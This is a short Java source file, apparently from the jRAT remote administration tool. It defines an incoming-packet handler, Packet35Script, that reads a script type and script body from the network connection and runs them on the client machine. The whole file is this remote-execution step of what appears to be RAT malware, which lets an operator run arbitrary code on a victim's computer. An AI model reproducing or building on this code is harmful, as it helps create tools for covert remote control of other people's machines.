package jrat.client.packets.incoming;

import io.jrat.common.script.AbstractScript;
import jrat.client.Connection;

public class Packet35Script extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String type = con.readLine();
		String content = con.readLine();
		
		AbstractScript script = AbstractScript.getScript(type);
		script.setContent(content);
		script.perform();
	}

}
